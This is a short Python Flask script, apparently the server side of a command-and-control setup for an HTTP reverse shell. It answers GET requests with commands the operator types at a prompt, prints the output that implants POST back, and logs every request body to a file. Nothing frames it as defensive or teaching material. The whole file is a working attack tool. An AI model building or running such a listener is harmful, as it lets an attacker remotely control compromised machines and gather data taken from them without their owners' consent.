from flask import Flask, request
import logging

WHITE = '\033[1;37m';END = '\033[0m'
banner = ("""
┏━┓┏━╸┏━┓╻ ╻┏━╸┏━┓   ┏━╸╻  ┏━┓┏━┓╻┏ 
┗━┓┣╸ ┣┳┛┃┏┛┣╸ ┣┳┛   ┣╸ ┃  ┣━┫┗━┓┣┻┓
┗━┛┗━╸╹┗╸┗┛ ┗━╸╹┗╸   ╹  ┗━╸╹ ╹┗━┛╹ ╹
""")
print(f"{WHITE}{banner}{END}")



addr="0.0.0.0"
port=5000
app = Flask(__name__)

@app.after_request
def log(log):
    with open('server.log', 'a') as file:
        file.write(f"{request.data.decode('utf-8')}\n")
    return log
@app.route('/', methods=['GET'])
def get():
    cmd=input('~ $ ')
    return cmd
@app.route('/', methods=['POST'])
def post():
    print(request.get_data().decode('utf-8'))
    return ""
logging.getLogger('werkzeug').setLevel(logging.ERROR)
if __name__ == "__main__":
    print(f"[!] waiting requests on -> http://{addr}:{port} \n")
    from waitress import serve
    serve(app, host=addr, port=port)
